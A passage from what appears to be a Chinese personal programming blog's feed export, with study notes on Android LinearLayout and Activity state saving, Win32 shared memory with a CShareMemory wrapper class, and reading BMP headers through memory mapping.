class="name">TextView</span> </span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">"2"</span></span></span><br><span class="line"><span class="tag">     /&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">"3"</span></span></span><br><span class="line"><span class="tag">     /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码生成的样式：<br><img src="img1.jpg" alt="安卓线性布局"><br>这个是默认的，但是当我们将：<code>android:orientation=&quot;vertical&quot;</code>设置为：<code>android:orientation=&quot;horizontal&quot;</code>的时候我们的布局将会变成横向的分布了，我觉得这个就和Java的流布局差不多。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">"right"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">"4"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"9.0"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orientation</span>=<span class="string">"vertical"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">"12"</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_weight</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"7"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"8"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"9"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"/"</span>/&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_weight</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"7"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"8"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"9"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"/"</span>/&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_weight</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"7"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"8"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"9"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"/"</span>/&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_weight</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"7"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"8"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"9"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"/"</span>/&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"Clear"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_weight</span>=<span class="string">"3"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个布局今本上就实现了一个计算器，但是按钮需要铁姐大一点，这里比较重要的就是一个容器包含容器的一个思想，还有一点就是<code>android:layout_weight=&quot;3&quot;</code>这个样子的一个属性，这个属性就是权重的意思，就是说你的这个节点在这个容器中所占的比例差不多，权重都一样的话呢你这个节点就会像是平局你分给了你这个节点下的子节点。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity保存恢复数据</title>
    <url>/2020/02/01/Activity%E4%BF%9D%E5%AD%98%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="Activity保存恢复数据"><a href="#Activity保存恢复数据" class="headerlink" title="Activity保存恢复数据"></a>Activity保存恢复数据</h1><p>有的时候我们在窗口转化的过程中，某些数据是不被保存的，例如在你旋转手的时候一些变量会不被保存，一些控件值不被保存，那该如何去做呢？</p>
<h2 id="控件数据丢失"><a href="#控件数据丢失" class="headerlink" title="控件数据丢失"></a>控件数据丢失</h2><p>这个很简单，主要是由于你的控件没有给出相应的控件ID所导致的，我们只需要将我们的控件编辑上我们的ID就好了。</p>
<h2 id="变量数据的丢失"><a href="#变量数据的丢失" class="headerlink" title="变量数据的丢失"></a>变量数据的丢失</h2><p>这个也不麻烦，但是需要的是保存我们重要的数据，我觉得用上一些Map集合是很方便的，例如在我们转换屏幕的方向的时候，数据就会重新刷新。<br>那么如何保存呢？我们可以重写<code>onSaveInstanceState</code>方法<br>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onSaveInstanceState</span><span class="params">(Bundle outState)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	outState.putString(<span class="string">"a"</span>, a);</span><br><span class="line">	<span class="keyword">super</span>.onSaveInstanceState(outState);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个时候我是保存了a变量，保存在”a”这个键值下面。<br>那么如何回复呢？其实有两种方法，一种是<code>onCreate</code>方法中进行恢复，一种是<code>onRestoreInstanceState</code>方法中进行恢复，两种方法都是可以的，但是这种情况下我们一般建议使用<code>onRestoreInstanceState</code>这个方法，其实是一样的，在我们这个方法被Java虚拟机调用的时候我们会传进来一个Bundle类型的一个参数，这个东西就有点像集合，也是键对值的一个操作，具体操作如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRestoreInstanceState</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	a = savedInstanceState.getString(<span class="string">"a"</span>);</span><br><span class="line">	<span class="keyword">super</span>.onRestoreInstanceState(savedInstanceState);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>onCreate</code>方法中也有那个Bundle参数，使用方法一样的。<br>记录一下这个Toast类，就是在窗口上提示一个小窗口：<br><code>Toast.makeText(getApplicationContext(),a+&quot;&quot;,Toast.LENGTH_SHORT).show();</code></p>
<p>很方便的一个小东西，但是就是太快了是不行的！</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>内存映射ShareMemory</title>
    <url>/2020/01/31/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84ShareMemory/</url>
    <content><![CDATA[<h1 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h1><p>Windows下进程的地址空间在逻辑上是相互隔离的，但在物理上却是重叠的，就是说一块内存，可以给好多进程用，比若说共享内存进行读取，有点像管道奥。<br>今天还是照着书写的，可能在写这一张的人没怎么注意，还是有一个错误就是提前进行UnMap了。<br>我们首先看一下这个共享内存的简单实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szName[] = <span class="string">"MemoryName"</span>;</span><br><span class="line">	<span class="keyword">char</span> szData[] = <span class="string">"123456789"</span>;</span><br><span class="line">	LPVOID  pBuffer;</span><br><span class="line">	HANDLE hMap = OpenFileMapping(FILE_MAP_ALL_ACCESS,<span class="number">0</span>,szName);</span><br><span class="line">	<span class="keyword">if</span>(hMap != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		pBuffer = MapViewOfFile(hMap,FILE_MAP_ALL_ACCESS,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">		<span class="comment">//cout&lt;&lt;pBuffer&lt;&lt;endl;</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"读出数据%s"</span>,pBuffer);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		hMap = CreateFileMapping(INVALID_HANDLE_VALUE,<span class="literal">NULL</span>,PAGE_READWRITE,<span class="number">0</span>,<span class="built_in">strlen</span>(szData)+<span class="number">1</span>,szName);</span><br><span class="line">		pBuffer = MapViewOfFile(hMap,FILE_MAP_ALL_ACCESS,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">		<span class="built_in">strcpy</span>((<span class="keyword">char</span> *)pBuffer,szData);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"写入数据"</span>&lt;&lt;szData&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">	UnmapViewOfFile(pBuffer);</span><br><span class="line">	CloseHandle(hMap);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们现实定义了一个数据名称和数据值，然后尝试打开这个内存映射，如果打开失败的话呢就是没有创建这个内存映射然后我们就开始创建，现实创建一个内存映射，然后在用<code>MapViewOfFile</code>进行内存地址的分配，然后再用<code>strcpy</code>进行数据的copy，然后就在这个时候，书上写的是吧<code>getchar()</code>卸载<code>CloseHandle</code>后面，但是这个样子就没有意义了，那么我们就应该先让他卡住才行，如果打开这个内存映射成功的话呢我们就读取这个内存映射的地址，然后输出，在这里需要注意不能用C++的一个输入输出流，因为我们定义pBuffer的时候我们不是定义的char类型，而是一个通用的指针类型，这里需要注意。</p>
<h2 id="CShareMemory类的封装"><a href="#CShareMemory类的封装" class="headerlink" title="CShareMemory类的封装"></a>CShareMemory类的封装</h2><p>在这里我们封装一下我们的内存共享类，方便之后的使用。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __SHAREMEMORY_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __SHAREMEMORY_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CShareMemory</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CShareMemory(<span class="keyword">const</span> <span class="keyword">char</span> *pszMapName,<span class="keyword">int</span> nFileSzie = <span class="number">0</span>,BOOL bSever = FALSE);</span><br><span class="line">	~CShareMemory();</span><br><span class="line">	<span class="function">LPVOID <span class="title">GetBuffer</span><span class="params">()</span><span class="keyword">const</span> </span>&#123;<span class="keyword">return</span> m_pBuffer;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	LPVOID m_pBuffer;</span><br><span class="line">	HANDLE m_hFileMap;</span><br><span class="line">	BOOL m_bSever;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">inline</span> CShareMemory::CShareMemory(<span class="keyword">const</span> <span class="keyword">char</span> *pszMapName,<span class="keyword">int</span> nFileSzie,BOOL bSever):m_hFileMap(<span class="literal">NULL</span>),m_pBuffer(<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (bSever)</span><br><span class="line">	&#123;</span><br><span class="line">		m_hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,<span class="literal">NULL</span>,PAGE_READWRITE,<span class="number">0</span>,nFileSzie,pszMapName);</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		m_hFileMap = OpenFileMapping(FILE_MAP_ALL_ACCESS,FALSE,pszMapName);</span><br><span class="line">	&#125;</span><br><span class="line">	m_pBuffer = (LPBYTE)MapViewOfFile(m_hFileMap,FILE_MAP_ALL_ACCESS,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	m_bSever = bSever;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">inline</span> CShareMemory::~CShareMemory()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (m_bSever)</span><br><span class="line">	&#123;</span><br><span class="line">		UnmapViewOfFile(m_pBuffer);</span><br><span class="line">		CloseHandle(m_hFileMap);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span><span class="comment">//__SHAREMEMORY_H__</span></span></span><br></pre></td></tr></table></figure>
<p>和之前一样还是判断是否是重定义了，然后就是一个服务端几个客户端的类型，这个地方书上写的不是很严谨，我不知道是他没注意还是他就是这个意思，读他的析构函数的时候我发现，他并没有判断这个是不是服务器端还是客户端就进行了映射的关闭，我怀疑他是这个地方有点误解。<br>在这里写的时候他用了一个内联函数的方法进行写的，析构函数这个可以，但是这个构造函数我感觉其实是没啥必要，都这么多行了，是不是内联的都无所谓了我感觉（内联函数就是编译器直接拷贝，不需要进行函数的构造这种的），然后在函数后面有个const意思就是说，我们这个函数是不会修改这个成员变量的值的，参数有const的话呢就是说我们不会修改这个参数的值的。还有就是函数后面跟上<code>：</code>其实就是将后面的变量进行初始化，如果构造函数后面有的话呢一般来说就是父类的一个初始化了，这里比较特殊。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>内存映射-打开BMP图片</title>
    <url>/2020/01/31/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84-%E6%89%93%E5%BC%80BMP%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<h2 id="读取BMP图片"><a href="#读取BMP图片" class="headerlink" title="读取BMP图片"></a>读取BMP图片</h2><p>之前说到<code>LoadBitmap</code>这个函数用来加载一幅位图，现在正好复习到内存映射，就用内存映射来写这么一个相关的操作（这个我是照着书上写的，但是不知道那本书有点老还是QQ截图有问题，有地方我纠结了好一阵，后面说）。</p>
<p>首先我们想要原生态的打开BMP，也就是通过文件映射的方法打开BMP文件，那么我们至少要了解BMP文件的一个文件格式，这个文件格式和PE文件的很像，但是没有那个复杂，无非就是一些图片大小之类的一些信息。<br>我们要了解的结构体：</p>
<ol>
<li><p><code>BITMAPFILEHEADER</code>BMP图片头文件</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPFILEHEADER</span> &#123;</span> <span class="comment">// bmfh </span></span><br><span class="line">    WORD    bfType; </span><br><span class="line">    DWORD   bfSize; </span><br><span class="line">    WORD    bfReserved1; </span><br><span class="line">    WORD    bfReserved2; </span><br><span class="line">    DWORD   bfOffBits; </span><br><span class="line">&#125; BITMAPFILEHEADER;</span><br></pre></td></tr></table></figure>
<p>结构体比较简单，比较重要的就是第一个和最后一个，第一个就是表示这个文件的一个类型，其实就和PE文件基本上一模一样，PE是MZ，BMP是BM，就是一个模子刻出来的。最后一个就是说真实的图片数据的RVA。</p>
</li>
<li><p><code>BITMAPINFO</code>BMP 图片信息</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFO</span> &#123;</span> <span class="comment">// bmi </span></span><br><span class="line">    BITMAPINFOHEADER bmiHeader; </span><br><span class="line">    RGBQUAD          bmiColors[<span class="number">1</span>]; </span><br><span class="line">&#125; BITMAPINFO;</span><br></pre></td></tr></table></figure>
<p>这个的话呢里面比较重要的就是<code>bmiHeader</code>这个，里面还有一个结构体，这个结构体就是我们的信息了：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span>&#123;</span> <span class="comment">// bmih </span></span><br><span class="line">    DWORD  biSize; </span><br><span class="line">    LONG   biWidth; </span><br><span class="line">    LONG   biHeight; </span><br><span class="line">    WORD   biPlanes; </span><br><span class="line">    WORD   biBitCount </span><br><span class="line">    DWORD  biCompression; </span><br><span class="line">    DWORD  biSizeImage; </span><br><span class="line">    LONG   biXPelsPerMeter; </span><br><span class="line">    LONG   biYPelsPerMeter; </span><br><span class="line">    DWORD  biClrUsed; </span><br><span class="line">    DWORD  biClrImportant; </span><br><span class="line">&#125; BITMAPINFOHEADER;</span><br></pre></td></tr></table></figure>
<p>这些信息就比较通俗易懂了，看名字就能看懂了。</p>
</li>
</ol>
<h2 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h2><p>首先在我们的程序窗口<code>OnCreate</code>的时候我们我们先去创建一个兼容的DC。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> CStudy_BMPDlg::OnCreate(LPCREATESTRUCT lpCreateStruct)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (CDialogEx::OnCreate(lpCreateStruct) == <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="function">CClientDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">	m_hMemDC = CreateCompatibleDC(dc);</span><br><span class="line">	m_nHeight = <span class="number">0</span>;</span><br><span class="line">	m_nWidth = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span>  在此添加您专用的创建代码</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们将图片的宽高都设置为0。<br>对了，还是先看看我是怎么声明一些的变量的得吧：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	HDC m_hMemDC;</span><br><span class="line">	<span class="keyword">int</span> m_nHeight;</span><br><span class="line">	<span class="keyword">int</span> m_nWidth;</span><br></pre></td></tr></table></figure>
<p>这个的话呢，一个是存放我们客户去大小的兼容DC，一个是BMP图片的宽和高。<br>创建写好之后，我们在销毁的时候不要忘记删除掉我们的DC对象，但是不是普通的<code>delete</code>而是用<code>DeleteDC</code>这个函数进行删除。</p>
